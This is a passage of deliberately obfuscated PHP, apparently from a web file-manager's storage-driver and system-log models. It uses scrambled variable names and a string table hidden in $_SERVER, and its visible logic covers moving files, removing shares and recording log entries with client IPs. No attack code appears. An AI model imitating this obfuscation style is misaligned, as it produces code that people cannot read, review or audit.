$¬—Âû€Ò[215]); show_json(LNG($¬—Âû€Ò[2311]), !1, $Ú¸Üåù); } $ğ¾ıãƒ = new $‡ëÂ‡ùª($×æ‚ç«); if (in_array($¿™ôš‚è, $ğ¾ıãƒ->objectDriver)) { try { if (!$ğ¾ıãƒ->isBucketCors() && !$ğ¾ıãƒ->setBucketCors()) { $¤²ù˜×Í = LNG($¬—Âû€Ò[2313]); $¤²ù˜×Í .= $¬—Âû€Ò[2314] . LNG($¬—Âû€Ò[2315]); } } catch (Exception $Ñäëö³Ï) { $¤²ù˜×Í = $Ñäëö³Ï->getMessage(); } if (isset($¤²ù˜×Í)) { return $this->_parseError($¤²ù˜×Í, $¿™ôš‚è, $‘ÑÕß¡±); } if ($¿™ôš‚è == $¬—Âû€Ò[68] && !$ğ¾ıãƒ->checkRegion()) { return $this->_parseError(LNG($¬—Âû€Ò[2316]), $¿™ôš‚è, $‘ÑÕß¡±); } } $íµçÓöµ = rtrim($×æ‚ç«[$¬—Âû€Ò[1259]], $¬—Âû€Ò[8]) . $¬—Âû€Ò[8]; $–ÇˆšÂè = $ğ¾ıãƒ->getPath($íµçÓöµ . $¬—Âû€Ò[1263]); try { if ($¿™ôš‚è == $¬—Âû€Ò[109]) { $ğ¾ıãƒ->mkdir($íµçÓöµ); } $ˆàÌ´ä½ = $ğ¾ıãƒ->mkfile($–ÇˆšÂè); if (!$ˆàÌ´ä½) { $¤²ù˜×Í = LNG($¬—Âû€Ò[2313]); } } catch (Exception $Ñäëö³Ï) { $¤²ù˜×Í = $Ñäëö³Ï->getMessage(); } if (isset($¤²ù˜×Í)) { return $this->_parseError($¤²ù˜×Í, $¿™ôš‚è, $‘ÑÕß¡±); } $×æ‚ç«[$¬—Âû€Ò[1259]] = $íµçÓöµ; $Ú¸Üåù[$¬—Âû€Ò[6]] = json_encode($×æ‚ç«); $Ú¸Üåù[$¬—Âû€Ò[98]] = $ì—Œ…Úò; return !0; } private function _parseError($ı¿Ìéî, $šà¼á», $Ù ¤‹Ö“ = false) { $ÏÚÔˆÀ¹ =& $_SERVER[Š—Â“œÔ]; if ($šà¼á» == $ÏÚÔˆÀ¹[68] && stripos($ı¿Ìéî, $ÏÚÔˆÀ¹[2317])) { $î‹úÚµ = explode($ÏÚÔˆÀ¹[10], $ı¿Ìéî); $‚„ĞÒÖ´ = isset($î‹úÚµ[1]) ? $î‹úÚµ[1] : $ÏÚÔˆÀ¹[12]; $ÀÚÙšÈ© = array($ÏÚÔˆÀ¹[2318] => LNG($ÏÚÔˆÀ¹[2319]), $ÏÚÔˆÀ¹[2320] => LNG($ÏÚÔˆÀ¹[2321])); if (isset($ÀÚÙšÈ©[$‚„ĞÒÖ´])) { $ı¿Ìéî = $ÀÚÙšÈ©[$‚„ĞÒÖ´]; } } if (stripos($ı¿Ìéî, $ÏÚÔˆÀ¹[2322]) === 0) { $ï¢ÎòÀ¯ = strpos($ı¿Ìéî, $ÏÚÔˆÀ¹[178]); if ($ï¢ÎòÀ¯ === !1) { $ï¢ÎòÀ¯ = strpos($ı¿Ìéî, $ÏÚÔˆÀ¹[4]); } if ($ï¢ÎòÀ¯ !== !1) { $ı¿Ìéî = substr($ı¿Ìéî, $ï¢ÎòÀ¯ + 1); } } $ı¿Ìéî = LNG($ÏÚÔˆÀ¹[1266]) . $ı¿Ìéî; if ($Ù ¤‹Ö“) { return $ı¿Ìéî; } show_json($ı¿Ìéî, !1); } public function driverListSystem() { $Ì¸›¨ôó =& $_SERVER[Š—Â“œÔ]; $õ´¥ŞÂ = parent::listData(); $íÕ—‰îÌ = array(); foreach ($õ´¥ŞÂ as $¨¡§‹Ì) { unset($¨¡§‹Ì[$Ì¸›¨ôó[233]], $¨¡§‹Ì[$Ì¸›¨ôó[88]]); if (!is_array($¨¡§‹Ì[$Ì¸›¨ôó[6]])) { $¨¡§‹Ì[$Ì¸›¨ôó[6]] = json_decode($¨¡§‹Ì[$Ì¸›¨ôó[6]], !0); } $íÕ—‰îÌ[] = $¨¡§‹Ì; } return $íÕ—‰îÌ; } public function defaultDriver() { $–¼ö½Ú£ =& $_SERVER[Š—Â“œÔ]; $Â º¯— = parent::listData(); $Ğïéç‡… = array_filter_by_field($Â º¯—, $–¼ö½Ú£[37], 1); $Ğïéç‡… = $Ğïéç‡…[0]; if (!$Ğïéç‡…) { return array(); } if (!is_array($Ğïéç‡…[$–¼ö½Ú£[6]])) { $Ğïéç‡…[$–¼ö½Ú£[6]] = json_decode($Ğïéç‡…[$–¼ö½Ú£[6]], !0); } return $Ğïéç‡…; } public function driverInfo($§à“À€) { $Çœ¬Ó´¢ =& $_SERVER[Š—Â“œÔ]; $€–¬‚É¾ = array_to_keyvalue(parent::listData(), $Çœ¬Ó´¢[477]); if (!isset($€–¬‚É¾[$§à“À€])) { return !1; } $”¢‹ï´ = $€–¬‚É¾[$§à“À€]; if (!is_array($”¢‹ï´[$Çœ¬Ó´¢[6]])) { $”¢‹ï´[$Çœ¬Ó´¢[6]] = json_decode($”¢‹ï´[$Çœ¬Ó´¢[6]], !0); } return $”¢‹ï´; } public function remove($–úì¤ûü) { $this->removeShareItems($–úì¤ûü); return parent::remove($–úì¤ûü); } public function removeWithFile($ê±Õ‰€, $¼ŠñÊÂ, $û§á•‚¾, $Õüíîòß = false) { $·Ò¬Œ²½ =& $_SERVER[Š—Â“œÔ]; $¶áå•á× = array($·Ò¬Œ²½[885] => $ê±Õ‰€); $óºÓ½§ü = Model($·Ò¬Œ²½[546])->where($¶áå•á×)->count(); $ÍÙ¨¯õÒ = Model($·Ò¬Œ²½[546])->where($¶áå•á×)->sum($·Ò¬Œ²½[79]); $Èš×ºêÔ = $¼ŠñÊÂ . $·Ò¬Œ²½[2323] . $ê±Õ‰€; $ Ä®Á¾¦ = LNG($¼ŠñÊÂ == $·Ò¬Œ²½[625] ? $·Ò¬Œ²½[2324] : $·Ò¬Œ²½[2325]); $Ææëô¤ = new TaskFileTransfer($Èš×ºêÔ, $·Ò¬Œ²½[215], $óºÓ½§ü, $ Ä®Á¾¦ . $·Ò¬Œ²½[464] . $û§á•‚¾[$·Ò¬Œ²½[32]] . $·Ò¬Œ²½[214] . $ê±Õ‰€); $Ææëô¤->task[$·Ò¬Œ²½[830]] = (double) $ÍÙ¨¯õÒ; $ÄÔ±â‹ª = KodIO::defaultDriver(); $ª…÷‡­‰ = $ÄÔ±â‹ª[$·Ò¬Œ²½[477]]; $™ÙÂ‚² = $ı˜Ò¿´Á = $îÉ¶‰Ö³ = array(); $•Ü¤Áš  = Model($·Ò¬Œ²½[232])->where($¶áå•á×)->field($·Ò¬Œ²½[2326])->select(); foreach ($•Ü¤Áš  as $›Á“Û¥) { $Ò¸òåƒ£ = $›Á“Û¥[$·Ò¬Œ²½[543]]; if ($Õüíîòß) { $ı˜Ò¿´Á[] = $Ò¸òåƒ£; continue; } $çÙ‡ÎòÉ = $›Á“Û¥[$·Ò¬Œ²½[87]]; $ïÓµ³‡ï = get_path_father($çÙ‡ÎòÉ); $îÉ¶‰Ö³[] = $ïÓµ³‡ï; $ïÓµ³‡ï = str_replace("\x7b\x69\x6f\72{$ê±Õ‰€}\x7d\x2f", "\173\x69\x6f\72{$ª…÷‡­‰}\175\x2f", $ïÓµ³‡ï); if (!IO::exist($çÙ‡ÎòÉ)) { $™ÙÂ‚²[] = $Ò¸òåƒ£; $Ææëô¤->updateFileEnd($›Á“Û¥[$·Ò¬Œ²½[32]], $›Á“Û¥[$·Ò¬Œ²½[79]]); write_log($·Ò¬Œ²½[2327] . $çÙ‡ÎòÉ, $·Ò¬Œ²½[1902]); continue; } $›öÅöä‚ = IO::move($çÙ‡ÎòÉ, $ïÓµ³‡ï, REPEAT_RENAME); if (!$›öÅöä‚) { $ı˜Ò¿´Á[] = $Ò¸òåƒ£; $Ææëô¤->updateFileEnd($›Á“Û¥[$·Ò¬Œ²½[32]], $›Á“Û¥[$·Ò¬Œ²½[79]]); write_log($·Ò¬Œ²½[2328] . $çÙ‡ÎòÉ, $·Ò¬Œ²½[1902]); continue; } $¶áå•á× = array($·Ò¬Œ²½[543] => $Ò¸òåƒ£); $Êœ–Ë¡Ğ = array($·Ò¬Œ²½[885] => $ª…÷‡­‰, $·Ò¬Œ²½[87] => $›öÅöä‚); Model($·Ò¬Œ²½[232])->where($¶áå•á×)->save($Êœ–Ë¡Ğ); } $ş¼…ÛİÙ = $Ææëô¤->task; if (!$Õüíîòß) { Cache::set($Èš×ºêÔ, $ş¼…ÛİÙ); } $Ææëô¤->end(); $™ÙÂ‚² = array_unique($™ÙÂ‚²); $ı˜Ò¿´Á = array_unique($ı˜Ò¿´Á); if (!$Õüíîòß && ($™ÙÂ‚² || $ı˜Ò¿´Á)) { $ü¥şß‘ = array(); if ($™ÙÂ‚²) { $ü¥şß‘[] = sprintf(LNG($·Ò¬Œ²½[2329]), count($™ÙÂ‚²)); } if ($ı˜Ò¿´Á) { $ü¥şß‘[] = sprintf(LNG($·Ò¬Œ²½[2330]), count($ı˜Ò¿´Á)); } $ü¥şß‘ = sprintf(LNG($·Ò¬Œ²½[2331]), implode($·Ò¬Œ²½[2332], $ü¥şß‘)) . $·Ò¬Œ²½[2333] . date($·Ò¬Œ²½[2334]) . $·Ò¬Œ²½[2335]; if ($¼ŠñÊÂ == $·Ò¬Œ²½[1939]) { $ü¥şß‘ .= $·Ò¬Œ²½[2336] . LNG($·Ò¬Œ²½[2337]); } else { $ü¥şß‘ = LNG($·Ò¬Œ²½[2338]) . $·Ò¬Œ²½[2339] . $ü¥şß‘; } $ş¼…ÛİÙ[$·Ò¬Œ²½[1261]] = $ü¥şß‘; Cache::set($Èš×ºêÔ, $ş¼…ÛİÙ); unset($û§á•‚¾[$·Ò¬Œ²½[6]]); $³À’™î… = array($·Ò¬Œ²½[477] => $ê±Õ‰€, $·Ò¬Œ²½[2210] => $·Ò¬Œ²½[625], $·Ò¬Œ²½[32] => $û§á•‚¾[$·Ò¬Œ²½[32]], $·Ò¬Œ²½[98] => $û§á•‚¾[$·Ò¬Œ²½[98]]); Hook::trigger($·Ò¬Œ²½[1781], array($·Ò¬Œ²½[1284] => $³À’™î…, $·Ò¬Œ²½[1294] => !0)); show_json($ü¥şß‘, !1, 100111); } if ($¼ŠñÊÂ == $·Ò¬Œ²½[625]) { return !0; } if ($™ÙÂ‚² || $ı˜Ò¿´Á) { $³¸±³§£ = array_merge($™ÙÂ‚², $ı˜Ò¿´Á); $³¸±³§£ = array_filter(array_unique($³¸±³§£)); $this->removeByFileID($³¸±³§£); } if ($îÉ¶‰Ö³) { $îÉ¶‰Ö³ = array_filter(array_unique($îÉ¶‰Ö³)); foreach ($îÉ¶‰Ö³ as $çÙ‡ÎòÉ) { $ŸšÅÊ¨Ì = IO::has($çÙ‡ÎòÉ, !0); if (!$ŸšÅÊ¨Ì[$·Ò¬Œ²½[241]] && !$ŸšÅÊ¨Ì[$·Ò¬Œ²½[242]]) { IO::remove($çÙ‡ÎòÉ); } } } return $this->remove($ê±Õ‰€); } private function removeByFileID($®íñÉ²Î = array()) { $Ü»ù‚¾Ê =& $_SERVER[Š—Â“œÔ]; if (empty($®íñÉ²Î)) { return; } $±üŞ¥ = array($Ü»ù‚¾Ê[543] => array($Ü»ù‚¾Ê[7], $®íñÉ²Î)); $Š¼„¾” = Model($Ü»ù‚¾Ê[1419])->where($±üŞ¥)->field($Ü»ù‚¾Ê[193])->select(); if (!$Š¼„¾”) { return Model($Ü»ù‚¾Ê[546])->remove($®íñÉ²Î); } $Š¼„¾” = array_to_keyvalue($Š¼„¾”, $Ü»ù‚¾Ê[12], $Ü»ù‚¾Ê[193]); foreach ($Š¼„¾” as $õŠ®ÖÛˆ) { Model($Ü»ù‚¾Ê[892])->removeNow($õŠ®ÖÛˆ, !1); } } private function removeShareItems($ŠÓ—›ä) { $èõÙıÂç =& $_SERVER[Š—Â“œÔ]; $‹ëªü¨í = "\173\x69\157\x3a{$ŠÓ—›ä}\175\x2f"; $¤ƒƒİäñ = array($èõÙıÂç[193] => 0, $èõÙıÂç[1254] => array($èõÙıÂç[461], "{$‹ëªü¨í}\x25")); $„Î«¾Êß = Model($èõÙıÂç[1950])->where($¤ƒƒİäñ)->field($èõÙıÂç[670])->select(); if (empty($„Î«¾Êß)) { return; } $¬²ŠÏ”û = array_to_keyvalue($„Î«¾Êß, $èõÙıÂç[12], $èõÙıÂç[670]); Model($èõÙıÂç[669])->remove($¬²ŠÏ”û); } } class SystemLightAppModel extends ModelBaseLight { public $optionType = "\x53\171\x73\x74\145\155\x2e\x4c\151\x67\150\x74\x41\160\x70"; public $modelType = "\123\171\x73\164\x65\x6d\117\x70\164\x69\x6f\156"; public $field = array("\x6e\141\155\x65", "\x67\162\157\x75\x70", "\x64\145\x73\x63", "\143\x6f\156\164\x65\156\x74"); public function listData($Óşş•ÀŸ = false, $’ä¯ÕÔŞ = "\x6d\157\x64\x69\146\171\124\151\155\145", $¢ì©ìº› = true) { return parent::listData($Óşş•ÀŸ, $’ä¯ÕÔŞ, $¢ì©ìº›); } public function remove($ò¶ÂÑäÍ) { $ä½ñëŠˆ = $this->findByName($ò¶ÂÑäÍ); if (!$ä½ñëŠˆ) { return !1; } return parent::remove($ä½ñëŠˆ[$_SERVER[Š—Â“œÔ][477]]); } public function add($Ä‘‡š€ó) { if ($this->findByName($Ä‘‡š€ó[$_SERVER[Š—Â“œÔ][32]])) { return !1; } return parent::insert($Ä‘‡š€ó); } public function update($Ó¸Â”Ï, $ñö¯Äª³) { $¹¥°×¡£ =& $_SERVER[Š—Â“œÔ]; $Ê”‡‹˜´ = $this->findByName($Ó¸Â”Ï); $‰Ì–ÑÑÕ = $this->findByName($ñö¯Äª³[$¹¥°×¡£[32]]); if (!$Ê”‡‹˜´ || $‰Ì–ÑÑÕ && $‰Ì–ÑÑÕ[$¹¥°×¡£[477]] != $Ê”‡‹˜´[$¹¥°×¡£[477]]) { return !1; } return parent::update($Ê”‡‹˜´[$¹¥°×¡£[477]], $ñö¯Äª³); } } class SystemLogModel extends ModelBase { protected $tableName = "\163\x79\x73\164\x65\155\137\x6c\157\147"; protected $dataAuto = array(array("\x63\x72\x65\141\x74\145\124\151\x6d\145", "\x74\x69\155\145", "\151\156\163\x65\x72\164", "\146\165\x6e\x63\x74\x69\x6f\156")); public $typeList; function __construct() { parent::__construct(); $this->typeList = $this->typeListAll(); } public function typeListAll() { $ÉÍ±Ê‹– =& $_SERVER[Š—Â“œÔ]; return array($ÉÍ±Ê‹–[2340] => LNG($ÉÍ±Ê‹–[2341]), $ÉÍ±Ê‹–[2342] => LNG($ÉÍ±Ê‹–[2343]), $ÉÍ±Ê‹–[1913] => LNG($ÉÍ±Ê‹–[2344]), $ÉÍ±Ê‹–[2345] => LNG($ÉÍ±Ê‹–[2346]), $ÉÍ±Ê‹–[2347] => LNG($ÉÍ±Ê‹–[2348]), $ÉÍ±Ê‹–[2349] => LNG($ÉÍ±Ê‹–[2350]), $ÉÍ±Ê‹–[2351] => LNG($ÉÍ±Ê‹–[2352]), $ÉÍ±Ê‹–[1943] => LNG($ÉÍ±Ê‹–[2352]), $ÉÍ±Ê‹–[1944] => LNG($ÉÍ±Ê‹–[2353]), $ÉÍ±Ê‹–[2354] => LNG($ÉÍ±Ê‹–[2355]), $ÉÍ±Ê‹–[2356] => LNG($ÉÍ±Ê‹–[2357]), $ÉÍ±Ê‹–[2358] => LNG($ÉÍ±Ê‹–[2359]), $ÉÍ±Ê‹–[2360] => LNG($ÉÍ±Ê‹–[2361]), $ÉÍ±Ê‹–[1941] => LNG($ÉÍ±Ê‹–[2362]), $ÉÍ±Ê‹–[2363] => LNG($ÉÍ±Ê‹–[2364]), $ÉÍ±Ê‹–[1948] => LNG($ÉÍ±Ê‹–[2365]), $ÉÍ±Ê‹–[2366] => LNG($ÉÍ±Ê‹–[2367]), $ÉÍ±Ê‹–[2368] => LNG($ÉÍ±Ê‹–[2369]), $ÉÍ±Ê‹–[2370] => LNG($ÉÍ±Ê‹–[2371]), $ÉÍ±Ê‹–[2372] => LNG($ÉÍ±Ê‹–[2373]), $ÉÍ±Ê‹–[1951] => LNG($ÉÍ±Ê‹–[2374]), $ÉÍ±Ê‹–[1952] => LNG($ÉÍ±Ê‹–[2375]), $ÉÍ±Ê‹–[2376] => LNG($ÉÍ±Ê‹–[2377]), $ÉÍ±Ê‹–[2378] => LNG($ÉÍ±Ê‹–[2379]), $ÉÍ±Ê‹–[2380] => LNG($ÉÍ±Ê‹–[2381]), $ÉÍ±Ê‹–[1946] => LNG($ÉÍ±Ê‹–[2382]), $ÉÍ±Ê‹–[2383] => LNG($ÉÍ±Ê‹–[2384]), $ÉÍ±Ê‹–[1945] => LNG($ÉÍ±Ê‹–[2385]), $ÉÍ±Ê‹–[2386] => LNG($ÉÍ±Ê‹–[2387]), $ÉÍ±Ê‹–[2388] => LNG($ÉÍ±Ê‹–[2389]), $ÉÍ±Ê‹–[2390] => LNG($ÉÍ±Ê‹–[2389]), $ÉÍ±Ê‹–[2391] => LNG($ÉÍ±Ê‹–[2392]), $ÉÍ±Ê‹–[2393] => LNG($ÉÍ±Ê‹–[2393]), $ÉÍ±Ê‹–[2394] => LNG($ÉÍ±Ê‹–[1917]), $ÉÍ±Ê‹–[2395] => LNG($ÉÍ±Ê‹–[2396]), $ÉÍ±Ê‹–[2397] => LNG($ÉÍ±Ê‹–[2398]), $ÉÍ±Ê‹–[2399] => LNG($ÉÍ±Ê‹–[2400]), $ÉÍ±Ê‹–[2401] => LNG($ÉÍ±Ê‹–[2402]), $ÉÍ±Ê‹–[2403] => LNG($ÉÍ±Ê‹–[2404]), $ÉÍ±Ê‹–[2405] => LNG($ÉÍ±Ê‹–[2405]), $ÉÍ±Ê‹–[2406] => LNG($ÉÍ±Ê‹–[2407]), $ÉÍ±Ê‹–[2408] => LNG($ÉÍ±Ê‹–[2409]), $ÉÍ±Ê‹–[2410] => LNG($ÉÍ±Ê‹–[2411]), $ÉÍ±Ê‹–[2412] => LNG($ÉÍ±Ê‹–[2413]), $ÉÍ±Ê‹–[2414] => LNG($ÉÍ±Ê‹–[2415]), $ÉÍ±Ê‹–[2416] => LNG($ÉÍ±Ê‹–[2417]), $ÉÍ±Ê‹–[212] => LNG($ÉÍ±Ê‹–[212]), $ÉÍ±Ê‹–[213] => LNG($ÉÍ±Ê‹–[2418]), $ÉÍ±Ê‹–[2419] => LNG($ÉÍ±Ê‹–[2419])); } private function typeFile() { $’ß€ÄãÌ =& $_SERVER[Š—Â“œÔ]; $¬×Àç‘ = array($’ß€ÄãÌ[1948] => array($’ß€ÄãÌ[1949]), $’ß€ÄãÌ[2358] => array($’ß€ÄãÌ[2420]), $’ß€ÄãÌ[2360] => array($’ß€ÄãÌ[2421]), $’ß€ÄãÌ[1941] => array($’ß€ÄãÌ[1942], $’ß€ÄãÌ[2422]), $’ß€ÄãÌ[2368] => array(), $’ß€ÄãÌ[2370] => array(), $’ß€ÄãÌ[2372] => array(), $’ß€ÄãÌ[1951] => array($’ß€ÄãÌ[1953]), $’ß€ÄãÌ[1952] => array($’ß€ÄãÌ[1953]), $’ß€ÄãÌ[2376] => array($’ß€ÄãÌ[2423]), $’ß€ÄãÌ[2378] => array($’ß€ÄãÌ[2423]), $’ß€ÄãÌ[2380] => array($’ß€ÄãÌ[2424]), $’ß€ÄãÌ[2366] => array($’ß€ÄãÌ[2425]), $’ß€ÄãÌ[1946] => array($’ß€ÄãÌ[2426]), $’ß€ÄãÌ[2383] => array($’ß€ÄãÌ[2427]), $’ß€ÄãÌ[1945] => array($’ß€ÄãÌ[1947])); return $¬×Àç‘; } private function typeAll() { $‘Şµšç =& $_SERVER[Š—Â“œÔ]; $›¯øÅëÂ = $this->typeList; $ÙÈó«ö™ = array_filter($this->typeFile()); foreach ($ÙÈó«ö™ as $Ø×Šüî¦ => $¯ƒ˜¿—±) { $›¯øÅëÂ[$¯ƒ˜¿—±[0]] = $›¯øÅëÂ[$Ø×Šüî¦]; } $›¯øÅëÂ[$‘Şµšç[1953]] = LNG($‘Şµšç[2428]); $›¯øÅëÂ[$‘Şµšç[2423]] = LNG($‘Şµšç[2429]); return $›¯øÅëÂ; } public function addLog($òÆôöú, $î¨©±· = array()) { $‚›¶ã– =& $_SERVER[Š—Â“œÔ]; if (!isset($this->typeList[$òÆôöú])) { return; } $ˆúÆÉô = Session::get($‚›¶ã–[2112]); if (!$ˆúÆÉô) { $ˆúÆÉô = _get($î¨©±·, $‚›¶ã–[1770], 0); } if ($òÆôöú == $‚›¶ã–[2395] && is_array($î¨©±·[$‚›¶ã–[2430]]) && !$î¨©±·[$‚›¶ã–[2430]]) { return; } $”Ì¸¿à£ = get_client_ip(); if (!$î¨©±· || strlen(json_encode($î¨©±·)) >= 1024 * 64) { if ($î¨©±· && is_array($î¨©±·)) { $î¨©±· = array_intersect_key($î¨©±·, array_flip($‚›¶ã–[477], $‚›¶ã–[32])); $î¨©±·[$‚›¶ã–[2431]] = $”Ì¸¿à£; } else { $î¨©±· = array($‚›¶ã–[2431] => $”Ì¸¿à£); } } else { if (is_array($î¨©±·)) { $î¨©±·[$‚›¶ã–[2431]] = $”Ì¸¿à£; } else { $î¨©±· = array($‚›¶ã–[1284] => $î¨©±·, $‚›¶ã–[2431] => $”Ì¸¿à£); } } $î¨©±· = array($‚›¶ã–[1760] => Session::sign(), $‚›¶ã–[1761] => intval($ˆúÆÉô), $‚›¶ã–[33] => $òÆôöú, $‚›¶ã–[1763] => json_encode($î¨©±·)); return parent::add($î¨©±·); } public function remove($«ş´Á·…) { $this->where(array($_SERVER[Š—Â“œÔ][495] => $«ş´Á·…))->delete(); } private function _makeOrder($İ€ô¨É‡ = '') { $Ï±‘üôˆ =& $_SERVER[Š—Â“œÔ]; $ İ‰ë‚È = $Ï±‘üôˆ[233]; $è– ¶â = array($Ï±‘üôˆ[525] => $Ï±‘üôˆ[526], $Ï±‘üôˆ[527] => $Ï±‘üôˆ[528]); $úğ‚Â’Ç = Input::get($Ï±‘üôˆ[533], $Ï±‘üôˆ[7], $Ï±‘üôˆ[2149], array($Ï±‘üôˆ[2066], $Ï±‘üôˆ[527])); $úğ‚Â’Ç = $è– ¶â[$úğ‚Â’Ç]; $İ€ô¨É‡ = $İ€ô¨É‡ . "{$ İ‰ë‚È}\40{$úğ‚Â’Ç}"; return $this->order($İ€ô¨É‡); } public function get($Òà­Û¶· = '') { $İÓŸºıÏ =& $_SERVER[Š—Â“œÔ]; if (!$Òà­Û¶·) { show_json(array()); } $ó×şºáİ = array(); if ($Òà­Û¶·[$İÓŸºıÏ[1770]]) { $ó×şºáİ[$İÓŸºıÏ[1770]] = $Òà­Û¶·[$İÓŸºıÏ[1770]]; } if (isset($Òà­Û¶·[$İÓŸºıÏ[827]])) { $ƒì³Š·Ö = $Òà­Û¶·[$İÓŸºıÏ[827]]; $‡ù»à® = isset($Òà­Û¶·[$İÓŸºıÏ[828]]) ? $Òà­Û¶·[$İÓŸºıÏ[828]] : time(); $ó×şºáİ[$İÓŸºıÏ[233]] = array($İÓŸºıÏ[410], array($ƒì³Š·Ö, $‡ù»à®)); } if ($Òà­Û¶·[$İÓŸºıÏ[33]]) { $Şˆò¸¿¦ = explode($İÓŸºıÏ[50], $Òà­Û¶·[$İÓŸºıÏ[33]]); $¾•ƒ“Çú = $this->typeFile(); $ÈíÖš› = array(); foreach ($Şˆò¸¿¦ as $­Ôñ»¬²) { $ÈíÖš›[] = $­Ôñ»¬²; if (isset($¾•ƒ“Çú[$­Ôñ»¬²])) { $ÈíÖš› = array_merge($ÈíÖš›, $¾•ƒ“Çú[$­Ôñ»¬²]); } } $ÈíÖš› = array_unique($ÈíÖš›); if ($ÈíÖš›) { $ó×şºáİ[$İÓŸºıÏ[33]] = array($İÓŸºıÏ[7], $ÈíÖš›); } } else { $ó×şºáİ[$İÓŸºıÏ[33]] = array($İÓŸºıÏ[2432], $İÓŸºıÏ[2433]); } if (!empty($Òà­Û¶·[$İÓŸºıÏ[2431]])) { $ó×şºáİ[$İÓŸºıÏ[528]] = array($İÓŸºıÏ[461], "\x25{$Òà­Û¶·[$İÓŸºıÏ[2431]]}\x25"); } $©”ÈïÂú = $this->_makeOrder()->where($ó×şºáİ)->selectPage(); if (empty($©”ÈïÂú[$İÓŸºıÏ[447]])) { show_json(array(), !0, $©”ÈïÂú[$İÓŸºıÏ[444]]); } $©”ÈïÂú[$İÓŸºıÏ[447]] = $this->logList($©”ÈïÂú[$İÓŸºıÏ[447]]); return $©”ÈïÂú; } private function ipAddress(&$øÈÈş) { $ÛïµÛ =& $_SERVER[Š—Â“œÔ]; if (!empty($øÈÈş[$ÛïµÛ[2431]])) { $¯»²³ = IpLocation::get($øÈÈş[$ÛïµÛ[2431]]); } else { $¯»²³ = LNG($ÛïµÛ[2434]); } $øÈÈş[$ÛïµÛ[2435]] = $¯»²³; } private function descZipDownload($Æãù’«Ï, &$Ãš³ÃÃ) { $›Õ…€¹… =& $_SERVER[Š—Â“œÔ]; if (!isset($Æãù’«Ï[$›Õ…€¹…[2436]])) { return; } $…³ÄŸí× = json_decode($Æãù’«Ï[$›Õ…€¹…[2436]], !0); foreach ($…³ÄŸí× as $ùËÙÚáƒ) { try { $ê¨ ô×© = IO::infoFullSimple($ùËÙÚáƒ[$›Õ…€¹…[87]]); } catch (Exception $±Íú÷ª) { continue; } $Æãù’«Ï[$›Õ…€¹…[87]] = $ùËÙÚáƒ[$›Õ…€¹…[87]]; $Ãš³ÃÃ[] = $Æãù’«Ï[$›Õ…€¹…[193]] = $ê¨ ô×©[$›Õ…€¹…[193]]; $Ãš³ÃÃ[] = $Æãù’«Ï[$›Õ…€¹…[2205]] = $ê¨ ô×©[$›Õ…€¹…[192]]; break; } return $Æãù’«Ï; } private function getSourceList(&$˜Ÿ—’ëŠ) { $ ˆş×¶¦ =& $_SERVER[Š—Â“œÔ]; $®²«â™® = array(); foreach ($˜Ÿ—’ëŠ as $ÖÜùŠĞŠ => $Ô˜ôıáò) { $ÀÔ˜ìı = json_decode($Ô˜ôıáò[$ ˆş×¶¦[528]], !0); if ($Ô˜ôıáò[$ ˆş×¶¦[33]] == $ ˆş×¶¦[1944]) { $ÀÔ˜ìı = $this->descZipDownload($ÀÔ˜ìı, $®²«â™®); $˜Ÿ—’ëŠ[$ÖÜùŠĞŠ][$ ˆş×¶¦[528]] = json_encode($ÀÔ˜ìı); continue; } if (strpos($Ô˜ôıáò[$ ˆş×¶¦[33]], $ ˆş×¶¦[2207]) !== 0) { if (!isset($ÀÔ˜ìı[$ ˆş×¶¦[87]]) || strpos($Ô˜ôıáò[$ ˆş×¶¦[33]], $ ˆş×¶¦[2437]) !== 0) { continue; } try { $Ù­§½¿« = IO::infoFullSimple($ÀÔ˜ìı[$ ˆş×¶¦[87]]); } catch (Exception $íğéà‰ğ) { continue; } $®²«â™®[] = $ÀÔ˜ìı[$ ˆş×¶¦[193]] = $Ù­§½¿«[$ ˆş×¶¦[193]]; $®²«â™®[] = $ÀÔ˜ìı[$ ˆş×¶¦[2205]] = $Ù­§½¿«[$ ˆş×¶¦[192]]; $˜Ÿ—’ëŠ[$ÖÜùŠĞŠ][$ ˆş×¶¦[528]] = json_encode($ÀÔ˜ìı); continue; } $®²«â™®[] = $ÀÔ˜ìı[$ ˆş×¶¦[193]]; $®²«â™®[] = $ÀÔ˜ìı[$ ˆş×¶¦[2205]]; if ($ÀÔ˜ìı[$ ˆş×¶¦[33]] == $ ˆş×¶¦[625]) { $®²«â™®[] = $ÀÔ˜ìı[$ ˆş×¶¦[528]][$ ˆş×¶¦[1238]]; $®²«â™®[] = $ÀÔ˜ìı[$ ˆş×¶¦[528]][$ ˆş×¶¦[1239]]; } if ($ÀÔ˜ìı[$ ˆş×¶¦[33]] == $ ˆş×¶¦[2216]) { $®²«â™®[] = $ÀÔ˜ìı[$ ˆş×¶¦[528]][$ ˆş×¶¦[193]]; } } if (!$®²«â™®) { return array(); } return Model($ ˆş×¶¦[892])->sourceListInfo($®²«â™®, !0); } private function logList($»§İâİ) { $Ô¤ëö±ı =& $_SERVER[Š—Â“œÔ]; $ò¬æåˆ  = array_to_keyvalue($»§İâİ, $Ô¤ëö±ı[12], $Ô¤ëö±ı[1770]); $±æı­ÍË = Model($Ô¤ëö±ı[599])->userListInfo(array_unique($ò¬æåˆ )); $šÏçû®ã = $this->getSourceList($»§İâİ); $Éû¦ö = $this->typeAll(); $Ü¦÷Ôšğ = array(); $˜ëÒØ¦ = array(); foreach ($»§İâİ as $’©Ú®í => $âÂüƒ³ğ) { $£úÒ–¾Ù = $âÂüƒ³ğ[$Ô¤ëö±ı[33]]; $éÜ‹ÍÆÏ = isset($±æı­ÍË[$âÂüƒ³ğ[$Ô¤ëö±ı[1770]]]) ? $±æı­ÍË[$âÂüƒ³ğ[$Ô¤ëö±ı[1770]]] : !1; $’ÀÔß÷ = strpos($£úÒ–¾Ù, $Ô¤ëö±ı[2438]) === 0 ? LNG($Ô¤ëö±ı[2439]) : LNG($Ô¤ëö±ı[2434]); $âÂüƒ³ğ[$Ô¤ëö±ı[32]] = isset($éÜ‹ÍÆÏ[$Ô¤ëö±ı[32]]) ? $éÜ‹ÍÆÏ[$Ô¤ëö±ı[32]] : LNG($Ô¤ëö±ı[2434]); $âÂüƒ³ğ[$Ô¤ëö±ı[2266]] = isset($éÜ‹ÍÆÏ[$Ô¤ëö±ı[2266]]) ? $éÜ‹ÍÆÏ[$Ô¤ëö±ı[2266]] : $Ô¤ëö±ı[12]; $âÂüƒ³ğ[$Ô¤ëö±ı[1658]] = isset($Éû¦ö[$£úÒ–¾Ù]) ? $Éû¦ö[$£úÒ–¾Ù] : $’ÀÔß÷; 